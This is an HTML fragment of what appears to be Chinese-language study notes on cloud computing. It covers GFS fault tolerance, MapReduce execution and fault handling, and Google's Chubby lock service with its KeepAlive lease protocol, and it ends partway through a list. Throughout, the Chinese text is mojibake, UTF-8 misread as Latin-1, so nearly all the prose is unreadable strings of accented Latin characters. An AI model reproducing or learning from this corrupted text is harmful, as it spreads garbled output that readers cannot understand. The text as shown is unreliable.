<h3 id="GFSçš„å®¹é”™æ–¹æ³•"><a href="#GFSçš„å®¹é”™æ–¹æ³•" class="headerlink" title="GFSçš„å®¹é”™æ–¹æ³•"></a>GFSçš„å®¹é”™æ–¹æ³•</h3><h4 id="Chunk-Serverå®¹é”™æœºåˆ¶"><a href="#Chunk-Serverå®¹é”™æœºåˆ¶" class="headerlink" title="Chunk Serverå®¹é”™æœºåˆ¶"></a>Chunk Serverå®¹é”™æœºåˆ¶</h4><ul>
<li>æ¯ä¸ªChunkæœ‰å¤šä¸ªå­˜å‚¨å‰¯æœ¬ï¼ˆé€šå¸¸æ˜¯3ä¸ªï¼‰ï¼Œåˆ†åˆ«å­˜å‚¨äºä¸é€šçš„æœåŠ¡å™¨ä¸Š</li>
<li>æ¯ä¸ªChunkåˆåˆ’åˆ†ä¸ºè‹¥å¹²Blockï¼ˆ64KBï¼‰ï¼Œæ¯ä¸ªBlockå¯¹åº”ä¸€ä¸ª32bitçš„æ ¡éªŒç ï¼Œä¿è¯æ•°æ®æ­£ç¡®ï¼ˆè‹¥æŸä¸ªBlocké”™è¯¯ï¼Œåˆ™è½¬ç§»è‡³å…¶ä»–Chunkå‰¯æœ¬ï¼‰</li>
</ul>
<h4 id="Masterå®¹é”™-å½±å­èŠ‚ç‚¹çƒ­å¤‡"><a href="#Masterå®¹é”™-å½±å­èŠ‚ç‚¹çƒ­å¤‡" class="headerlink" title="Masterå®¹é”™(å½±å­èŠ‚ç‚¹çƒ­å¤‡)"></a>Masterå®¹é”™(å½±å­èŠ‚ç‚¹çƒ­å¤‡)</h4><ul>
<li>ä¸‰ç±»å…ƒæ•°æ®ï¼šå‘½åç©ºé—´ï¼ˆç›®å½•ç»“æ„ï¼‰ã€Chunkä¸æ–‡ä»¶åçš„æ˜ å°„ï¼ˆå†™æ—¥å¿—æä¾›å®¹é”™ï¼‰ä»¥åŠChunkå‰¯æœ¬çš„ä½ç½®ä¿¡æ¯</li>
<li>å‰ä¸¤ç±»é€šè¿‡æ—¥å¿—æä¾›å®¹é”™ï¼ŒChunkå‰¯æœ¬ä¿¡æ¯å­˜å‚¨äºChunk Serverï¼ŒMasterå‡ºç°æ•…éšœæ—¶å¯æ¢å¤</li>
</ul>
<h1 id="äº‘è®¡ç®—-MapReduce"><a href="#äº‘è®¡ç®—-MapReduce" class="headerlink" title="äº‘è®¡ç®— - MapReduce"></a>äº‘è®¡ç®— - MapReduce</h1><p>MapReduce æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼è¿ç®—ç¨‹åºçš„ç¼–ç¨‹æ¡†æ¶ï¼Œæ˜¯ç”¨æˆ·å¼€å‘â€œåŸºäºhadoopçš„æ•°æ®åˆ†æåº”ç”¨â€çš„æ ¸å¿ƒæ¡†æ¶ã€‚MapReduce æ ¸å¿ƒåŠŸèƒ½æ˜¯å°†ç”¨æˆ·ç¼–å†™çš„ä¸šåŠ¡é€»è¾‘ä»£ç å’Œè‡ªå¸¦é»˜è®¤ç»„ä»¶æ•´åˆæˆä¸€ä¸ªå®Œæ•´çš„åˆ†å¸ƒå¼è¿ç®—ç¨‹åºï¼Œå¹¶å‘è¿è¡Œåœ¨ä¸€ä¸ª hadoop é›†ç¾¤ä¸Šã€‚</p>
<ul>
<li>ä¸€ä¸ªè½¯ä»¶æ¶æ„ï¼Œæ˜¯ä¸€ç§å¤„ç†æµ·é‡æ•°æ®çš„å¹¶è¡Œç¼–ç¨‹æ¨¡å¼</li>
<li>ç”¨äºå¤§è§„æ¨¡æ•°æ®é›†ï¼ˆé€šå¸¸å¤§äº1TBï¼‰çš„å¹¶è¡Œè¿ç®—</li>
<li>MapReduceå®ç°äº†Mapå’ŒReduceä¸¤ä¸ªåŠŸèƒ½</li>
<li><ul>
<li>MapæŠŠä¸€ä¸ªå‡½æ•°åº”ç”¨äºé›†åˆä¸­çš„æ‰€æœ‰æˆå‘˜ï¼Œç„¶åè¿”å›ä¸€ä¸ªåŸºäºè¿™ä¸ªå¤„ç†çš„ç»“æœé›†</li>
<li>Reduceå¯¹ç»“æœé›†è¿›è¡Œåˆ†ç±»å’Œå½’çº³</li>
<li>Map()å’Œ Reduce() ä¸¤ä¸ªå‡½æ•°å¯èƒ½ä¼šå¹¶è¡Œè¿è¡Œï¼Œå³ä½¿ä¸æ˜¯åœ¨åŒä¸€çš„ç³»ç»Ÿçš„åŒä¸€æ—¶åˆ»</li>
</ul>
</li>
</ul>
<h2 id="ä¸ºä»€ä¹ˆéœ€è¦MapReduceï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆéœ€è¦MapReduceï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦MapReduceï¼Ÿ"></a>ä¸ºä»€ä¹ˆéœ€è¦MapReduceï¼Ÿ</h2><ol>
<li>æµ·é‡æ•°æ®åœ¨å•æœºä¸Šå¤„ç†å› ä¸ºç¡¬ä»¶èµ„æºé™åˆ¶ï¼Œæ— æ³•èƒœä»»</li>
<li>è€Œä¸€æ—¦å°†å•æœºç‰ˆç¨‹åºæ‰©å±•åˆ°é›†ç¾¤æ¥åˆ†å¸ƒå¼è¿è¡Œï¼Œå°†æå¤§å¢åŠ ç¨‹åºçš„å¤æ‚åº¦å’Œå¼€å‘éš¾åº¦</li>
<li>å¼•å…¥ MapReduce æ¡†æ¶åï¼Œå¼€å‘äººå‘˜å¯ä»¥å°†ç»å¤§éƒ¨åˆ†å·¥ä½œé›†ä¸­åœ¨ä¸šåŠ¡é€»è¾‘çš„å¼€å‘ä¸Šï¼Œè€Œå°†åˆ†å¸ƒå¼è®¡ç®—ä¸­çš„å¤æ‚æ€§äº¤ç”±æ¡†æ¶æ¥å¤„ç†ã€‚</li>
</ol>
<h3 id="Google-MapReduceæ‰§è¡Œæµç¨‹"><a href="#Google-MapReduceæ‰§è¡Œæµç¨‹" class="headerlink" title="Google MapReduceæ‰§è¡Œæµç¨‹"></a>Google MapReduceæ‰§è¡Œæµç¨‹</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451837.png" alt="image-20190421142939749"></p>
<ol>
<li>ä¸€ä¸ªMapReduceç¨‹åºå¯åŠ¨çš„æ—¶å€™ï¼Œæœ€å…ˆå¯åŠ¨çš„æ˜¯ MRAppMasterï¼Œ MRAppMaster å¯åŠ¨åæ ¹æ®æœ¬æ¬¡ job çš„æè¿°ä¿¡æ¯ï¼Œè®¡ç®—å‡ºéœ€è¦çš„ maptask å®ä¾‹æ•°é‡ï¼Œç„¶åå‘é›†ç¾¤ç”³è¯·æœºå™¨å¯åŠ¨ç›¸åº”æ•°é‡çš„ maptask è¿›ç¨‹</li>
<li>maptask è¿›ç¨‹å¯åŠ¨ä¹‹åï¼Œæ ¹æ®ç»™å®šçš„æ•°æ®åˆ‡ç‰‡(å“ªä¸ªæ–‡ä»¶çš„å“ªä¸ªåç§»é‡èŒƒå›´)èŒƒå›´è¿›è¡Œæ•°æ®å¤„ç†ï¼Œä¸»ä½“æµç¨‹ä¸ºï¼š<ol>
<li>åˆ©ç”¨å®¢æˆ·æŒ‡å®šçš„ inputformat æ¥è·å– RecordReader è¯»å–æ•°æ®ï¼Œå½¢æˆè¾“å…¥ KV å¯¹</li>
<li>å°†è¾“å…¥ KV å¯¹ä¼ é€’ç»™å®¢æˆ·å®šä¹‰çš„ map()æ–¹æ³•ï¼Œåšé€»è¾‘è¿ç®—ï¼Œå¹¶å°† map()æ–¹æ³•è¾“å‡ºçš„ KV å¯¹æ”¶ é›†åˆ°ç¼“å­˜</li>
<li>å°†ç¼“å­˜ä¸­çš„ KV å¯¹æŒ‰ç…§ K åˆ†åŒºæ’åºåä¸æ–­æº¢å†™åˆ°ç£ç›˜æ–‡ä»¶ ï¼ˆè¶…è¿‡ç¼“å­˜å†…å­˜å†™åˆ°ç£ç›˜ä¸´æ—¶æ–‡ä»¶ï¼Œæœ€åéƒ½å†™åˆ°è¯¥æ–‡ä»¶ï¼Œruduce è·å–è¯¥æ–‡ä»¶åï¼Œåˆ é™¤ ï¼‰</li>
</ol>
</li>
<li>MRAppMaster ç›‘æ§åˆ°æ‰€æœ‰ maptask è¿›ç¨‹ä»»åŠ¡å®Œæˆä¹‹åï¼ˆçœŸå®æƒ…å†µæ˜¯ï¼ŒæŸäº› maptask è¿› ç¨‹å¤„ç†å®Œæˆåï¼Œå°±ä¼šå¼€å§‹å¯åŠ¨ reducetask å»å·²å®Œæˆçš„ maptask å¤„ fetch æ•°æ®ï¼‰ï¼Œä¼šæ ¹æ®å®¢æˆ·æŒ‡ å®šçš„å‚æ•°å¯åŠ¨ç›¸åº”æ•°é‡çš„ reducetask è¿›ç¨‹ï¼Œå¹¶å‘ŠçŸ¥ reducetask è¿›ç¨‹è¦å¤„ç†çš„æ•°æ®èŒƒå›´ï¼ˆæ•°æ®åˆ†åŒºï¼‰</li>
<li>Reducetask è¿›ç¨‹å¯åŠ¨ä¹‹åï¼Œæ ¹æ® MRAppMaster å‘ŠçŸ¥çš„å¾…å¤„ç†æ•°æ®æ‰€åœ¨ä½ç½®ï¼Œä»è‹¥å¹²å° maptask è¿è¡Œæ‰€åœ¨æœºå™¨ä¸Šè·å–åˆ°è‹¥å¹²ä¸ª maptask è¾“å‡ºç»“æœæ–‡ä»¶ï¼Œå¹¶åœ¨æœ¬åœ°è¿›è¡Œé‡æ–°å½’å¹¶æ’åºï¼Œ ç„¶åæŒ‰ç…§ç›¸åŒ key çš„ KV ä¸ºä¸€ä¸ªç»„ï¼Œè°ƒç”¨å®¢æˆ·å®šä¹‰çš„ reduce()æ–¹æ³•è¿›è¡Œé€»è¾‘è¿ç®—ï¼Œå¹¶æ”¶é›†è¿ç®—è¾“å‡ºçš„ç»“æœ KVï¼Œç„¶åè°ƒç”¨å®¢æˆ·æŒ‡å®šçš„ outputformat å°†ç»“æœæ•°æ®è¾“å‡ºåˆ°å¤–éƒ¨å­˜å‚¨</li>
</ol>
<h2 id="MapReduceçš„å®¹é”™"><a href="#MapReduceçš„å®¹é”™" class="headerlink" title="MapReduceçš„å®¹é”™"></a>MapReduceçš„å®¹é”™</h2><h3 id="Workeræ•…éšœ"><a href="#Workeræ•…éšœ" class="headerlink" title="Workeræ•…éšœ"></a>Workeræ•…éšœ</h3><ul>
<li>Master å‘¨æœŸæ€§çš„pingæ¯ä¸ªworkerã€‚å¦‚æœmasteråœ¨ä¸€ä¸ªç¡®å®šçš„æ—¶é—´æ®µå†…æ²¡æœ‰æ”¶åˆ°workerè¿”å›çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆå®ƒå°†æŠŠè¿™ä¸ªworkeræ ‡è®°æˆå¤±æ•ˆ</li>
<li>é‡æ–°æ‰§è¡Œè¯¥èŠ‚ç‚¹ä¸Šå·²ç»æ‰§è¡Œæˆ–å°šæœªæ‰§è¡Œçš„Mapä»»åŠ¡</li>
<li>é‡æ–°æ‰§è¡Œè¯¥èŠ‚ç‚¹ä¸Šæœªå®Œæˆçš„Reduceä»»åŠ¡ï¼Œå·²å®Œæˆçš„ä¸å†æ‰§è¡Œ</li>
</ul>
<h3 id="Masteræ•…éšœ"><a href="#Masteræ•…éšœ" class="headerlink" title="Masteræ•…éšœ"></a>Masteræ•…éšœ</h3><ul>
<li>å®šæœŸ<strong>å†™å…¥æ£€æŸ¥ç‚¹æ•°æ®</strong></li>
<li>ä»<strong>æ£€æŸ¥ç‚¹</strong>æ¢å¤</li>
</ul>
<h2 id="MapReduceçš„ä¼˜åŒ–"><a href="#MapReduceçš„ä¼˜åŒ–" class="headerlink" title="MapReduceçš„ä¼˜åŒ–"></a>MapReduceçš„ä¼˜åŒ–</h2><h3 id="ä»»åŠ¡å¤‡ä»½æœºåˆ¶"><a href="#ä»»åŠ¡å¤‡ä»½æœºåˆ¶" class="headerlink" title="ä»»åŠ¡å¤‡ä»½æœºåˆ¶"></a>ä»»åŠ¡å¤‡ä»½æœºåˆ¶</h3><p>æ…¢çš„workers ä¼šä¸¥é‡åœ°æ‹–å»¶æ•´ä¸ªæ‰§è¡Œå®Œæˆçš„æ—¶é—´</p>
<ul>
<li>ç”±äºå…¶ä»–çš„ä»»åŠ¡å ç”¨äº†èµ„æº</li>
<li>ç£ç›˜æŸå</li>
</ul>
<p>è§£å†³æ–¹æ¡ˆ: åœ¨ä¸´è¿‘ç»“æŸçš„æ—¶å€™ï¼Œå¯åŠ¨å¤šä¸ªè¿›ç¨‹æ¥æ‰§è¡Œå°šæœªå®Œæˆçš„ä»»åŠ¡</p>
<ul>
<li>è°å…ˆå®Œæˆï¼Œå°±ç®—è°</li>
</ul>
<p>å¯ä»¥ååˆ†æ˜¾è‘—åœ°æé«˜æ‰§è¡Œæ•ˆç‡</p>
<h3 id="æœ¬åœ°å¤„ç†"><a href="#æœ¬åœ°å¤„ç†" class="headerlink" title="æœ¬åœ°å¤„ç†"></a>æœ¬åœ°å¤„ç†</h3><p>Master è°ƒåº¦ç­–ç•¥:</p>
<ul>
<li>å‘GFSè¯¢é—®è·å¾—è¾“å…¥æ–‡ä»¶blockså‰¯æœ¬çš„ä½ç½®ä¿¡æ¯</li>
<li>Map tasks çš„è¾“å…¥æ•°æ®é€šå¸¸æŒ‰ 64MBæ¥åˆ’åˆ† (GFS block å¤§å°)</li>
<li>æŒ‰ç…§blocksæ‰€åœ¨çš„æœºå™¨æˆ–æœºå™¨æ‰€åœ¨æœºæ¶çš„èŒƒå›´ï¼Œè¿›è¡Œè°ƒåº¦</li>
</ul>
<p>æ•ˆæœ</p>
<ul>
<li>ç»å¤§éƒ¨åˆ†æœºå™¨ä»æœ¬åœ°è¯»å–æ–‡ä»¶ä½œä¸ºè¾“å…¥ï¼ŒèŠ‚çœå¤§é‡å¸¦å®½</li>
</ul>
<h3 id="è·³è¿‡æœ‰é—®é¢˜çš„è®°å½•"><a href="#è·³è¿‡æœ‰é—®é¢˜çš„è®°å½•" class="headerlink" title="è·³è¿‡æœ‰é—®é¢˜çš„è®°å½•"></a>è·³è¿‡æœ‰é—®é¢˜çš„è®°å½•</h3><ul>
<li>ä¸€äº›ç‰¹å®šçš„è¾“å…¥æ•°æ®å¸¸å¯¼è‡´Map&#x2F;Reduceæ— æ³•è¿è¡Œ</li>
<li>æœ€å¥½çš„è§£å†³æ–¹æ³•æ˜¯è°ƒè¯•æˆ–è€…ä¿®æ”¹<ul>
<li>ä¸ä¸€å®šå¯è¡Œ~ å¯èƒ½éœ€è¦ç¬¬ä¸‰æ–¹åº“æˆ–æºç </li>
</ul>
</li>
<li>åœ¨æ¯ä¸ªworkeré‡Œè¿è¡Œä¸€ä¸ªä¿¡å·å¤„ç†ç¨‹åºï¼Œæ•è·mapæˆ–reduceä»»åŠ¡å´©æºƒæ—¶å‘å‡ºçš„ä¿¡å·ï¼Œä¸€æ—¦æ•è·ï¼Œå°±ä¼šå‘masteræŠ¥å‘Šï¼ŒåŒæ—¶æŠ¥å‘Šè¾“å…¥è®°å½•çš„ç¼–å·ä¿¡æ¯ã€‚å¦‚æœmasterçœ‹åˆ°ä¸€æ¡è®°å½•æœ‰ä¸¤æ¬¡å´©æºƒä¿¡æ¯ï¼Œé‚£ä¹ˆå°±ä¼šå¯¹è¯¥è®°å½•è¿›è¡Œæ ‡è®°ï¼Œä¸‹æ¬¡è¿è¡Œçš„æ—¶å€™ï¼Œè·³è¿‡è¯¥è®°å½•ã€‚</li>
</ul>
<h1 id="äº‘è®¡ç®—-Chubby"><a href="#äº‘è®¡ç®—-Chubby" class="headerlink" title="äº‘è®¡ç®— - Chubby"></a>äº‘è®¡ç®— - Chubby</h1><h2 id="Chubbyæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#Chubbyæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="Chubbyæ˜¯ä»€ä¹ˆï¼Ÿ"></a>Chubbyæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p><strong>Chubbyæ˜¯Googleè®¾è®¡çš„æä¾›ç²—ç²’åº¦é”æœåŠ¡çš„ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œä¸»è¦ç”¨äºè§£å†³åˆ†å¸ƒå¼ä¸€è‡´æ€§é—®é¢˜ã€‚</strong></p>
<p>åˆ’é‡ç‚¹ï¼šChubbyæ˜¯ä¸€ä¸ª<strong>æ–‡ä»¶ç³»ç»Ÿ</strong>ã€‚</p>
<p><strong>ç²—ç²’åº¦æ˜¯ä¸€ä¸ªä»€ä¹ˆæ¦‚å¿µï¼Ÿ</strong></p>
<p>ç²—ç²’åº¦æ˜¯æŒ‡é¢—ç²’åº¦å¾ˆå¤§ï¼Œç›¸å¯¹è€Œè¨€æœ‰ç»†ç²’åº¦è¿™ä¸€æ¦‚å¿µã€‚</p>
<p>ä¸¤è€…çš„å·®å¼‚åœ¨äºæŒæœ‰é”çš„æ—¶é—´ã€‚ç»†ç²’åº¦çš„é”æŒæœ‰æ—¶é—´å¾ˆçŸ­ï¼Œå¸¸å¸¸åªæœ‰å‡ ç§’ç”šè‡³æ›´å°‘ï¼Œè€Œç²—ç²’åº¦çš„é”æŒæœ‰çš„æ—¶é—´å¯é•¿è¾¾å‡ å¤©ï¼Œé€‰æ‹©ç²—ç²’åº¦çš„é”å¯ä»¥å‡å°‘é¢‘ç¹æ¢é”å¸¦æ¥çš„ç³»ç»Ÿå¼€é”€ã€‚</p>
<p><strong>é”çš„é¢—ç²’åº¦è¶Šå¤§ï¼Œé”ä½çš„èµ„æºè¶Šå¤§ï¼Œæ€§èƒ½å½±å“è¶Šå¤§ã€‚</strong></p>
<p><strong>åˆ†å¸ƒå¼ä¸€è‡´æ€§é—®é¢˜æ˜¯ä¸ªå•¥ï¼Ÿ</strong></p>
<p>åœ¨ä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œæœ‰ä¸€ç»„çš„Processï¼Œå®ƒä»¬éœ€è¦ç¡®å®šä¸€ä¸ªValueã€‚äºæ˜¯æ¯ä¸ªProcesséƒ½æå‡ºäº†ä¸€ä¸ªValueï¼Œä¸€è‡´æ€§å°±æ˜¯æŒ‡åªæœ‰å…¶ä¸­çš„ä¸€ä¸ªValueèƒ½å¤Ÿè¢«é€‰ä¸­ä½œä¸ºæœ€åç¡®å®šçš„å€¼ï¼Œå¹¶ä¸”å½“è¿™ä¸ªå€¼è¢«é€‰å‡ºæ¥ä»¥åï¼Œæ‰€æœ‰çš„Processéƒ½éœ€è¦è¢«é€šçŸ¥åˆ°ã€‚</p>
<h2 id="Chubbyçš„è®¾è®¡ç›®æ ‡"><a href="#Chubbyçš„è®¾è®¡ç›®æ ‡" class="headerlink" title="Chubbyçš„è®¾è®¡ç›®æ ‡"></a>Chubbyçš„è®¾è®¡ç›®æ ‡</h2><h3 id="éœ€è¦å®ç°çš„ç‰¹æ€§"><a href="#éœ€è¦å®ç°çš„ç‰¹æ€§" class="headerlink" title="éœ€è¦å®ç°çš„ç‰¹æ€§"></a>éœ€è¦å®ç°çš„ç‰¹æ€§</h3><ul>
<li>é«˜å¯ç”¨æ€§</li>
<li>é«˜å¯é æ€§</li>
<li>æ”¯æŒç²—ç²’åº¦çš„å»ºè®®æ€§é”æœåŠ¡</li>
<li>æ”¯æŒå°è§„æ¨¡æ–‡ä»¶ç›´æ¥å­˜å‚¨</li>
</ul>
<h3 id="ä¸ä½œè€ƒè™‘çš„ç‰¹æ€§"><a href="#ä¸ä½œè€ƒè™‘çš„ç‰¹æ€§" class="headerlink" title="ä¸ä½œè€ƒè™‘çš„ç‰¹æ€§"></a>ä¸ä½œè€ƒè™‘çš„ç‰¹æ€§</h3><ul>
<li>é«˜æ€§èƒ½ ä½¿ç”¨GFSä¸­å¹¶å‘è¯»å®ç°</li>
<li>å­˜å‚¨èƒ½åŠ›</li>
</ul>
<h2 id="Chubbyçš„ç³»ç»Ÿæ¶æ„"><a href="#Chubbyçš„ç³»ç»Ÿæ¶æ„" class="headerlink" title="Chubbyçš„ç³»ç»Ÿæ¶æ„"></a>Chubbyçš„ç³»ç»Ÿæ¶æ„</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451838.png" alt="image-20190421160105314"></p>
<p>Chubbyè¢«åˆ’åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†ï¼š</p>
<ul>
<li><p>å®¢æˆ·ç«¯</p>
<p>å®¢æˆ·è¿™ä¸€ç«¯æ¯ä¸ªå®¢æˆ·åº”ç”¨ç¨‹åºéƒ½æœ‰ä¸€ä¸ªChubbyç¨‹åºåº“ï¼ˆChubby Libraryï¼‰ï¼Œå®¢æˆ·ç«¯çš„æ‰€æœ‰åº”ç”¨éƒ½æ˜¯é€šè¿‡è°ƒç”¨è¿™ä¸ªåº“ä¸­çš„ç›¸å…³å‡½æ•°æ¥å®Œæˆçš„ã€‚</p>
</li>
<li><p>æœåŠ¡å™¨ç«¯</p>
<p>æœåŠ¡å™¨ä¸€ç«¯ç§°ä¸ºChubbyå•å…ƒï¼Œä¸€èˆ¬æ˜¯ç”±äº”ä¸ªç§°ä¸ºå‰¯æœ¬ï¼ˆReplicaï¼‰çš„æœåŠ¡å™¨ç»„æˆçš„ï¼Œè¿™äº”ä¸ªå‰¯æœ¬åœ¨é…ç½®ä¸Šå®Œå…¨ä¸€è‡´ï¼Œå¹¶ä¸”åœ¨ç³»ç»Ÿåˆšå¼€å§‹æ—¶å¤„äºå¯¹ç­‰åœ°ä½ã€‚</p>
</li>
</ul>
<p><strong>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ä¹‹é—´é€šè¿‡è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRPCï¼‰æ¥è¿æ¥ã€‚</strong></p>
<h2 id="Chubbyæ–‡ä»¶ç³»ç»Ÿ"><a href="#Chubbyæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="Chubbyæ–‡ä»¶ç³»ç»Ÿ"></a>Chubbyæ–‡ä»¶ç³»ç»Ÿ</h2><p>Chubbyç³»ç»Ÿæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼çš„ã€å­˜å‚¨å¤§é‡å°æ–‡ä»¶çš„æ–‡ä»¶ç³»ç»Ÿ</p>
<ul>
<li>Chubbyä¸­çš„é”å°±æ˜¯<strong>æ–‡ä»¶</strong></li>
<li>åˆ›å»ºæ–‡ä»¶å°±æ˜¯è¿›è¡Œâ€œåŠ é”â€æ“ä½œï¼Œ<strong>åˆ›å»ºæ–‡ä»¶æˆåŠŸçš„é‚£ä¸ªserverå…¶å®å°±æ˜¯æŠ¢å åˆ°äº†â€œé”â€</strong></li>
<li>ç”¨æˆ·é€šè¿‡æ‰“å¼€ã€å…³é—­å’Œå­˜å–æ–‡ä»¶ï¼Œè·å–å…±äº«é”æˆ–è€…ç‹¬å é”ï¼›å¹¶ä¸”é€šè¿‡é€šä¿¡æœºåˆ¶ï¼Œå‘ç”¨æˆ·å‘é€æ›´æ–°ä¿¡æ¯</li>
</ul>
<h2 id="Chubbyå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ç«¯çš„é€šä¿¡è¿‡ç¨‹"><a href="#Chubbyå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ç«¯çš„é€šä¿¡è¿‡ç¨‹" class="headerlink" title="Chubbyå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ç«¯çš„é€šä¿¡è¿‡ç¨‹"></a>Chubbyå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ç«¯çš„é€šä¿¡è¿‡ç¨‹</h2><p><strong>å®¢æˆ·ç«¯å’Œä¸»æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡æ˜¯é€šè¿‡KeepAliveæ¡æ‰‹åè®®æ¥ç»´æŒçš„ã€‚</strong></p>
<p>KeepAliveæ˜¯å‘¨æœŸå‘é€çš„ä¸€ç§ä¿¡æ¯ï¼Œå®ƒä¸»è¦æœ‰ä¸¤æ–¹é¢çš„åŠŸèƒ½ï¼š</p>
<ul>
<li>å»¶è¿Ÿç§Ÿçº¦çš„æœ‰æ•ˆæœŸ</li>
<li>æºå¸¦äº‹ä»¶ä¿¡æ¯å‘Šè¯‰ç”¨æˆ·æ›´æ–°</li>
</ul>
<p>ä¸»è¦çš„äº‹ä»¶åŒ…æ‹¬ï¼š</p>
<ul>
<li>æ–‡ä»¶å†…å®¹è¢«ä¿®æ”¹</li>
<li>å­èŠ‚ç‚¹çš„å¢åŠ ã€åˆ é™¤å’Œä¿®æ”¹</li>
<li>ä¸»æœåŠ¡å™¨å‡ºé”™ã€å¥æŸ„å¤±æ•ˆç­‰ã€‚</li>
</ul>
<p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œé€šè¿‡KeepAliveæ¡æ‰‹åè®®ç§Ÿçº¦æœŸä¼šå¾—åˆ°å»¶é•¿ï¼Œäº‹ä»¶ä¹Ÿä¼šåŠæ—¶åœ°é€šçŸ¥ç»™ç”¨æˆ·ã€‚ä½†æ˜¯ç”±äºç³»ç»Ÿæœ‰ä¸€å®šçš„å¤±æ•ˆæ¦‚ç‡ï¼Œå¼•å…¥æ•…éšœå¤„ç†æªæ–½æ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451839.png" alt="image-20190421160713578"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451840.png" alt="image-20190421161842117"></p>
<p><strong>ç¬¦å·è¯´æ˜</strong>ï¼š</p>
<p>ä»å·¦åˆ°å³çš„æ°´å¹³æ–¹å‘è¡¨ç¤ºæ—¶é—´åœ¨å¢åŠ ï¼Œæ–œå‘ä¸Šçš„ç®­å¤´è¡¨ç¤ºä¸€æ¬¡KeepAliveè¯·æ±‚ï¼Œæ–œå‘ä¸‹çš„ç®­å¤´åˆ™æ˜¯ä¸»æœåŠ¡å™¨çš„ä¸€æ¬¡å›åº”ã€‚</p>
<p>M1ã€M2ã€M3è¡¨ç¤ºä¸åŒçš„ä¸»æœåŠ¡å™¨ç§Ÿçº¦æœŸã€‚</p>
<p>C1ã€C2ã€C3åˆ™æ˜¯å®¢æˆ·ç«¯å¯¹ä¸»æœåŠ¡å™¨ç§Ÿçº¦æœŸæ—¶é•¿åšå‡ºçš„ä¸€ä¸ªä¼°è®¡ã€‚</p>
<p><strong>å›¾è§£é‡Šï¼š</strong></p>
<ol>
<li>å®¢æˆ·ç«¯å‘ä¸»æœåŠ¡å™¨å‘å‡ºä¸€ä¸ªKeepAliveï¼ˆ1å·æ¶ˆæ¯ï¼‰è¯·æ±‚ã€‚</li>
<li>è¿™æ—¶æœåŠ¡å™¨ä¸€èˆ¬ä¸å›åº”å®¢æˆ·ç«¯ï¼Œå¦‚æœæœ‰éœ€è¦é€šçŸ¥çš„äº‹ä»¶æ—¶åˆ™ä¸»æœåŠ¡å™¨ä¼šç«‹åˆ»åšå‡ºå›åº”ã€‚</li>
<li>ç­‰åˆ°å®¢æˆ·ç«¯çš„ç§Ÿçº¦æœŸC1å¿«ç»“æŸçš„æ—¶å€™æ‰åšå‡ºå›åº”ï¼ˆ2å·æ¶ˆæ¯ï¼‰ã€‚å¹¶æ›´æ–°ä¸»æœåŠ¡å™¨ç§Ÿçº¦æœŸä¸ºM2ã€‚</li>
<li>å®¢æˆ·ç«¯åœ¨æ¥åˆ°è¿™ä¸ªå›åº”åè®¤ä¸ºè¯¥ä¸»æœåŠ¡å™¨ä»å¤„äºæ´»è·ƒçŠ¶æ€ï¼Œäºæ˜¯å°†ç§Ÿçº¦æœŸæ›´æ–°ä¸ºC2å¹¶ç«‹åˆ»å‘å‡ºæ–°çš„KeepAliveè¯·æ±‚ï¼ˆ3å·æ¶ˆæ¯ï¼‰ã€‚åŒæ ·åœ°ï¼Œä¸»æœåŠ¡å™¨å¯èƒ½ä¸æ˜¯ç«‹åˆ»å›åº”è€Œæ˜¯ç­‰å¾…C2æ¥è¿‘ç»“æŸã€‚</li>
<li><strong>ä½†æ˜¯åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¸»æœåŠ¡å™¨å‡ºç°æ•…éšœåœæ­¢ä½¿ç”¨ã€‚åœ¨ç­‰å¾…äº†ä¸€æ®µæ—¶é—´åC2åˆ°æœŸï¼Œç”±äºå¹¶æ²¡æœ‰æ”¶åˆ°ä¸»æœåŠ¡å™¨çš„å›åº”ï¼Œç³»ç»Ÿå‘å®¢æˆ·ç«¯å‘å‡ºä¸€ä¸ªå±é™©ï¼ˆJeopardyï¼‰äº‹ä»¶ï¼Œå®¢æˆ·ç«¯æ¸…ç©ºå¹¶æš‚æ—¶åœç”¨è‡ªå·±çš„ç¼“å­˜ï¼Œä»è€Œè¿›å…¥ä¸€ä¸ªç§°ä¸ºå®½é™æœŸï¼ˆGrace Periodï¼‰çš„å±é™©çŠ¶æ€ã€‚</strong></li>
<li><strong>è¿™ä¸ªå®½é™æœŸé»˜è®¤æ˜¯45ç§’ã€‚åœ¨å®½é™æœŸå†…ï¼Œå®¢æˆ·ç«¯ä¸ä¼šç«‹åˆ»æ–­å¼€å…¶ä¸æœåŠ¡å™¨ç«¯çš„è”ç³»ï¼Œè€Œæ˜¯ä¸æ–­åœ°åšæ¢è¯¢ã€‚</strong></li>
